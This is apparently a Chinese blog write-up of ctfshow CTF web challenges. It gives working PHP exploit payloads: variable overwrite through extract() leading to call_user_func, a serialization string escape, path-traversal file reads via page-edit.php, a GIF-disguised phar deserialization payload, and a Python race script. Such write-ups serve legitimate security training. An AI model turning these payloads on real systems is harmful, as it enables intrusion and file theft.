+++
title = "ctfshow大吉大利杯"
slug = "ctfshow-good-luck-cup"
description = "刷"
date = "2025-01-16T20:27:09"
lastmod = "2025-01-16T20:27:09"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["php", "phar"]
+++

## veryphp

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("config.php");
class qwq
{
    function __wakeup(){
        die("Access Denied!");
    }
    static function oao(){
        show_source("config.php");
    }
}
$str = file_get_contents("php://input");
if(preg_match('/\`|\_|\.|%|\*|\~|\^|\'|\"|\;|\(|\)|\]|g|e|l|i|\//is',$str)){
    die("I am sorry but you have to leave.");
}else{
    extract($_POST);
}
if(isset($shaw_root)){
    if(preg_match('/^\-[a-e][^a-zA-Z0-8]<b>(.*)>{4}\D*?(abc.*?)p(hp)*\@R(s|r).$/', $shaw_root)&& strlen($shaw_root)===29){
        echo $hint;
    }else{
        echo "Almost there."."<br>";
    }
}else{
    echo "<br>"."Input correct parameters"."<br>";
    die();
}
if($ans===$SecretNumber){
    echo "<br>"."Congratulations!"."<br>";
    call_user_func($my_ans);
}
```

很久没看到这种RCE了，拆开看

```php
$str = file_get_contents("php://input");
if(preg_match('/\`|\_|\.|%|\*|\~|\^|\'|\"|\;|\(|\)|\]|g|e|l|i|\//is',$str)){
    die("I am sorry but you have to leave.");
}else{
    extract($_POST);
}
```

参数可以用POST传入，并且如果绕过可以进行变量覆盖，

```php
if(isset($shaw_root)){
    if(preg_match('/^\-[a-e][^a-zA-Z0-8]<b>(.*)>{4}\D*?(abc.*?)p(hp)*\@R(s|r).$/', $shaw_root)&& strlen($shaw_root)===29){
        echo $hint;
    }else{
        echo "Almost there."."<br>";
    }
}else{
    echo "<br>"."Input correct parameters"."<br>";
    die();
}
```

可以得到hint，不过应该不重要吧，

```php
if($ans===$SecretNumber){
    echo "<br>"."Congratulations!"."<br>";
    call_user_func($my_ans);
}
```

看到最后，giao，看来是必须要得到hint了，这个参数应该是hint里面的，然后再利用参数覆盖就可以调用函数进行RCE了

```
^\-[a-e][^a-zA-Z0-8]<b>(.*)>{4}\D*?(abc.*?)p(hp)*\@R(s|r).$
```

把这个放正则里面测试，最后写出来这个是可以的

```
-a9<b>1>>>>tRRRRRRRabcphp@Rsa
```

然后传参就一个小解析特性而已，不说了

```http
POST / HTTP/1.1
Host: d82012c8-3430-4aee-9daa-271ed69283b6.challenge.ctf.show
Cookie: cf_clearance=njVuk6n3fG3iSfBdyNxTY8aBmiHIDhmhGjnalU3VDPE-1737030214-1.2.1.1-7fxjfOWKiHRDB9.m_470KRzQlTAabq1_HzyYhWoVihUBTfmp8B0cMGW.FclTmK9B2gKeoMVuUhkd9SOR70cRFon2SiLfmQkDMNguB2N1OtjR2qHRmaw0scIEgiL36I0fz0Wag7gIPjWsz13SIvJMvUEYyi4dGqw9nk8ZqyLzPVYOryUmWxbBhNupy9FG_0YX.C.8Qej4hNZFYL90ATPgQVwMjl7mLQZpg8q8_bKtKLwfioH2SNpCVr_sZL0TIQ1fM2hVjM3Biufjh67Eg5Q._RgvWuFJduvj2zhH2e9WEok
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://d82012c8-3430-4aee-9daa-271ed69283b6.challenge.ctf.show/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

shaw[root=-a9<b>1>>>>tRRRRRRRabcphp@Rsa
```

然后得到`hint`

```
Here is a hint : md5("shaw".($SecretNumber)."root")==166b47a5cb1ca2431a0edfcef200684f && strlen($SecretNumber)===5
```

写个脚本给解了

```python
import hashlib
import re

a = 'shaw'
b = 'root'
for i in range(10000, 99999):
    string = a + str(i) + b
    md5 = hashlib.md5(string.encode('utf-8')).hexdigest()
    if(re.findall("166b47a5cb1ca2431a0edfcef200684f", md5)):
        print(i)
```

```http
POST / HTTP/1.1
Host: d82012c8-3430-4aee-9daa-271ed69283b6.challenge.ctf.show
Cookie: cf_clearance=njVuk6n3fG3iSfBdyNxTY8aBmiHIDhmhGjnalU3VDPE-1737030214-1.2.1.1-7fxjfOWKiHRDB9.m_470KRzQlTAabq1_HzyYhWoVihUBTfmp8B0cMGW.FclTmK9B2gKeoMVuUhkd9SOR70cRFon2SiLfmQkDMNguB2N1OtjR2qHRmaw0scIEgiL36I0fz0Wag7gIPjWsz13SIvJMvUEYyi4dGqw9nk8ZqyLzPVYOryUmWxbBhNupy9FG_0YX.C.8Qej4hNZFYL90ATPgQVwMjl7mLQZpg8q8_bKtKLwfioH2SNpCVr_sZL0TIQ1fM2hVjM3Biufjh67Eg5Q._RgvWuFJduvj2zhH2e9WEok
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://d82012c8-3430-4aee-9daa-271ed69283b6.challenge.ctf.show/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

shaw[root=-a9<b>1>>>>tRRRRRRRabcphp@Rsa&ans=21475&my[ans=qwq::oao
```

## spaceman

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class spaceman
{
    public $username;
    public $password;
    public function __construct($username,$password)
    {
        $this->username = $username;
        $this->password = $password;
    }
    public function __wakeup()
    {
        if($this->password==='ctfshowvip')
        {
            include("flag.php");
            echo $flag;    
        }
        else
        {
            echo 'wrong password';
        }
    }
}
function filter($string){
    return str_replace('ctfshowup','ctfshow',$string);
}
$str = file_get_contents("php://input");
if(preg_match('/\_|\.|\]|\[/is',$str)){            
    die("I am sorry but you have to leave.");
}else{
    extract($_POST);
}
$ser = filter(serialize(new spaceman($user_name,$pass_word)));
$test = unserialize($ser);
?> wrong password
```

由多变少的字符逃逸，但是很明显的一个非预期呀，因为他的复制是利用`php://input`，可以直接赋值函数里面的参数即可

```
user%20name=1&pass%20word=ctfshowvip
```

不过还是看看预期吧，其实也是一个非常简单的题目

```php
<?php
class spaceman
{
    public $username="baozongwi";
    public $password="ctfshowvip";
}
$a=new spaceman();
echo serialize($a);
/*O:8:"spaceman":2:{s:8:"username";s:9:"baozongwi";s:8:"password";s:10:"ctfshowvip";}
```

每次放进去就会吃掉两个字符

```
user%20name=ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup&pass%20word=";s:8:"password";s:10:"ctfshowvip";}


O:8:"spaceman":2:{s:8:"username";s:162:"ctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshow";s:8:"password";s:36:"";s:8:"password";s:10:"ctfshowvip";}";}
ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup
";s:8:"password";s:10:"ctfshowvip";}
```

随便写个poc输进去，然后找到需要逃逸的部分，并且算出要补多少

```python
print(len('";s:8:"password";s:36:"'))
# 23然后我们补上1即可为倍数
print("ctfshowup"*12)
```

```http
POST / HTTP/1.1
Host: 31f65904-59be-463f-b1ff-4d928a4a7472.challenge.ctf.show
Cookie: cf_clearance=mN0V63zE.kJsdST4knc8A3Qjqv6kfhldDTFbKHQRG_I-1737033078-1.2.1.1-8O53Qx5bfvQqBGzaVPf83B9ZY_a6.LYEtlXNzhCbRjeHHiB542uVZvOObzOhNLWp..bPGvGPVSeeLbKCjF7bQ5kAVJMcXEWfq8kZs9Vpv1d_6ZYVxKQO7G_QxHdSNHYAaSOKvbkfcSar9f7Ml8Kr181w9WlSlszDZwosnRNd0gsXgEPXvKoLlU4oT2vl7zLGp_5fhui8D65jqm1YIib1gzTgj_B6E7tfSeBKrk2hfkRYJiK3jFAVEA_uPEqwZxs6HdQ0SFkoSXXoj8JNT4GTCfAFM6TxIeXK_Hv9Uk3G3aA
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://31f65904-59be-463f-b1ff-4d928a4a7472.challenge.ctf.show/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 170

user%20name=ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup&pass%20word=1";s:8:"password";s:10:"ctfshowvip";}
```

成功

## 虎山行

进来之后发现emm这个东西，是空白，可能是个大型网站，先扫一下

```
[09:11:19] 200 -    5KB - /install.php                                      
[09:11:19] 200 -    5KB - /install.php?profile=default                      
[09:11:39] 200 -    1KB - /README.md                                        
[09:11:53] 301 -  169B  - /upload  ->  http://8d0b36e1-33b6-4d88-bd26-a3d56ecef664.challenge.ctf.show/upload/
[09:11:53] 200 -    0B  - /upload/                                          
[09:11:53] 200 -  324B  - /upload.php                                       
[09:12:00] 200 -   48KB - /www.rar   
```

拿到源码之后发现代码不是什么大型网站，可以看看嘿，草率的看完了，没发现啥，扔到seay里面静态分析一下，在`page-edit.php`里面，128行到131行

```php
else if (isset($_GET['file'])) {
  $file_path = '../mc-files/pages/data/'.$_GET['file'];
  
  $data = (file_get_contents($file_path));
```

可以进行任意文件读取，参数没有做任何限制，直接看看能不能读取flag，先install然后读取，但是不得不说安装是真快啊

```
/mc-admin/page-edit.php?file=../../../../../../../flag
```

要登录之后才能拿到hint，

```
flag{fuckflag*********}flag not here maybe You can access ctfshowsecretfilehh directory
```

进行读取确定位置是在网站目录下

```
/mc-admin/page-edit.php?file=../../../ctfshowsecretfilehh
```

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include('waf.php');
class Ctfshow{
    public $ctfer = 'shower';
    public function __destruct(){
        system('cp /hint* /var/www/html/hint.txt');
    }
}
$filename = $_GET['file'];
readgzfile(waf($filename));
?>
```

很明显是phar反序列化，找到上传点事gif，这个很好绕过，那么我们再读取一下waf，别说这个路径是真不好找

```
/mc-admin/page-edit.php?file=../../../../../../../../var/www/html/ctfshowsecretfilehh/waf.php
```

```php
<?php
function waf($file){
    if (preg_match("/^phar|smtp|dict|zip|compress|file|etc|root|filter|php|flag|ctf|hint|\.\.\//i",$file)){
        die("姿势太简单啦，来一点骚的？！");
    }else{
        return $file;
    }
}
```

一样的绕过就可以了，写个poc

```php
<?php
class Ctfshow{
    public $ctfer = 'shower';
}
@unlink("phar.phar");
$phar=new Phar("phar.phar");
$phar->startBuffering();     //开缓冲
$phar->setStub("GIF89a<?php __HALT_COMPILER();?>");
$o=new Ctfshow();
$phar->setMetadata($o);
$phar->addFromString("test.txt","test");  // 写入test.txt
$phar->stopBuffering();      //关缓冲
?>
```

```
/ctfshowsecretfilehh/?file=zlib:phar:///var/www/html/upload/phar.gif
```

结果上传之后发现死活不能触发，去读取一下`upload.php`

```
/mc-admin/page-edit.php?file=../../../../../../../../var/www/html/upload.php
```

```php
<?php
error_reporting(0);
// 允许上传的图片后缀
$allowedExts = array("gif", "jpg", "png");
$temp = explode(".", $_FILES["file"]["name"]);
// echo $_FILES["file"]["size"];
$extension = end($temp);     // 获取文件后缀名
if ((($_FILES["file"]["type"] == "image/gif")
|| ($_FILES["file"]["type"] == "image/jpeg")
|| ($_FILES["file"]["type"] == "image/png"))
&& ($_FILES["file"]["size"] < 2048000)   // 小于 2000kb
&& in_array($extension, $allowedExts))
{
	if ($_FILES["file"]["error"] > 0)
	{
		echo "文件出错: " . $_FILES["file"]["error"] . "<br>";
	}
	else
	{
		if (file_exists("upload/" . $_FILES["file"]["name"]))
		{
			echo $_FILES["file"]["name"] . " 文件已经存在。 ";
		}
		else
		{
			$md5_unix_random =substr(md5(time()),0,8);
			$filename = $md5_unix_random.'.'.$extension;
            move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename);
            echo "上传成功,文件存在upload/";
		}
	}
}
else
{
	echo "文件类型仅支持jpg、png、gif等图片格式";
}
```

看来要得到时间，这里看看bp上传得不得行，得到时间之后正常写出来就行

```php
<?php
$a=substr(md5(strtotime('Fri, 17 Jan 2025 01:44:33 GMT')),0,8);
echo $a;
```

然后触发得到hint

```
/ctfshowsecretfilehh/?file=zlib:phar:///var/www/html/upload/f00f307d.gif

# hint 
flag{fuckflag***}flag also not here You can access ctfshowgetflaghhhh directory
```

```php
<?php
show_source(__FILE__);
$unser = $_GET['unser'];
class Unser {
    public $username='Firebasky';
    public $password;
    function __destruct() {
        if($this->username=='ctfshow'&&$this->password==(int)md5(time())){
            system('cp /ctfshow* /var/www/html/flag.txt');
        }
    }
}
$ctf=@unserialize($unser);
system('rm -rf /var/www/html/flag.txt');
```

这里好像就可以直接得到flag了，直接写脚本进行竞争，password要在线处理

```php
<?php
class Unser {
    public $username = 'ctfshow';
    public $password;

    public function __construct() {
        $this->password = md5(time());
    }
}

$a = new Unser();
echo serialize($a);
/*O:5:"Unser":2:{s:8:"username";s:7:"ctfshow";s:8:"password";s:32:"8f736705f7c67d0006d39487f48b539e";}
```

```python
import hashlib
import requests
import time

def MD5(str):
    h1 = hashlib.md5()
    h1.update(str.encode())
    return h1.hexdigest()

if __name__ == '__main__':
    url = 'http://23bc584d-d7d6-4525-961b-ec207d186fe0.challenge.ctf.show/ctfshowgetflaghhhh/'
    while True:
        x = MD5(str(int(time.time())))
        print(x)
        params = {
            'unser':'O:5:"Unser":2:{s:8:"username";s:7:"ctfshow";s:8:"password";s:32:"'+x+'";}'
        }
        res = requests.get(url=url,params=params)

```

然后访问就可以了

## 虎山行's revenge

这里直接从phar文件开始做，只不过这里不用安装了并且文件名换了

```
/mc-admin/page-edit.php?file=../../../../../../../../var/www/html/hsxhsxhsxctfshowsecretfilel/waf.php

/hsxhsxhsxctfshowsecretfilel/?file=zlib:phar:///var/www/html/upload/56a8f471.gif
```

```python
import hashlib
import requests
import time

def MD5(str):
    h1 = hashlib.md5()
    h1.update(str.encode())
    return h1.hexdigest()

if __name__ == '__main__':
    url = 'http://6ff8235b-cfb1-4bea-8587-e4202921a499.challenge.ctf.show/hsxctfshowsecretgetflagl/'
    while True:
        x = MD5(str(int(time.time())))
        print(x)
        params = {
            'unser':'O:5:"Unser":2:{s:8:"username";s:7:"ctfshow";s:8:"password";s:32:"'+x+'";}'
        }
        res = requests.get(url=url,params=params)

```

## 有手就行

这道题设置的有点操作啊，有些好奇，但是估计是写的一个前端监听，就是我第一次直接打开源码没有内容，但是后面打开刷新之后就有base64了，放在厨子里面发现是个base64隐写，用在线网站[base64隐写](https://tool.jisuapi.com/base642pic.html)

但是这个东西貌似没有什么用，然后回到刚开始就尝试的文件读取，当时看着没反应，现在知道可以源码里面来隐写了，那么久直接写`flag`，拿到一个微信小程序二维码，然后就不会了，后面看到好像是微信小程序逆向，算了不做了，后面还是想做的，然后发现扫了小程序之后有个地方可以`get-code`，但是好像emm失败了，因为说小程序已经关了
